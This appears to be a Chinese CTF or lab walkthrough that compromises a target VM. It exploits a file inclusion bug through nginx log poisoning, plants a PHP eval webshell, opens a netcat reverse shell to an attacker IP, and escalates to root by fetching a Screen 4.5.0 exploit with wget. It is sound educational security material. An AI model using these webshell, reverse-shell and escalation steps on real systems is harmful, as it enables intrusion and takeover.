## 漏洞发现

在浏览80端口HTTP服务的时候发现在Contact页面留言提交后显示的页面底部内容会随着页面的刷新而改变

![](../Images/29c0e8fecf07c02b0f916b9b1ba92fd2.png)

![](../Images/a0e97ffe708e92c41b0907f98db860e3.png)

  

这种情况与我们前面发现的footer.php页面相同，想到可能是hankyou.php页面包含了footer.php页面，存在文件包含漏洞

## 漏洞利用

通过前面的端口扫描我们可以知道靶机的环境是使用nginx搭建的，而nginx在网站上的每一步操作都将会被写入日志文件log(/var/log/nginx/access.log)内，因此我们可以通过log来拿 shell

使用burpsuite抓包修改请求，写入phpinfo()测试是否可以包含成功

![](../Images/e5f4f7c1044d3640458f88e0926395e6.png)

  

成功

![](../Images/ed4c21fab57a505a23dd4824068a9eae.png)

  

  

上传一句话木马

```
<?php @eval($_POST['XMTX']);?>
```

![](../Images/3ad9952645ca2092c8124772d7947439.png)

  

使用蚁剑链接

![](../Images/2f4871a5004b11bffa6836f59e208163.png)

  

## 反弹shell

创建监听

```
nc -vnlp 4444
```

![](../Images/89da94907a5745e671a644deebdd1697.png)

  

  

使用nc反弹shell到攻击机

```
nc 192.168.1.28 4444 -e /bin/bash
```

![](../Images/139699442052a636f42831580b334a45.png)

  

  

成功反弹shell

![](../Images/77d7775551abe0c045c0c899c8855480.png)

  

  

查找具有root权限的命令

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/10d62afd79212d1efcd77368041bdbfd.png)

  

可以看到存在screen 4.5.0，在互漏洞库中找到Screen 4.5.0 存在本地权限提升漏洞

![](../Images/733a632b0f9626a52cc115f03cce8360.png)

  

## 提权

将脚本文件下载到攻击机，通过vi查看发现格式为windows的dos格式

![](../Images/22ec904c52c117c59b691b61fa8bc5dc.png)

  

  

将其转换为linux格式

```
dos2unix 41154.sh
```

![](../Images/2616d0395f59d7cf63f1ad75a5d5fbae.png)

  

  

攻击机开启HTTP服务

```
python3 -m http.server
```

![](../Images/247e88e2e8bda1eb8d9975e13b885a9f.png)

  

  

下载脚本到靶机的tmp目录下（因为tmp权限为777）（也可以使用前面的蚁剑上传提权脚本）

```
wget http://192.168.1.28:8000/41154.sh
```

![](../Images/38f8e87e967d019ded0b97e90ff1f889.png)

  

  

赋予脚本执行权限并执行，成功得到root权限

![](../Images/ed4100a4487287d6b3a5502cd59649d8.png)
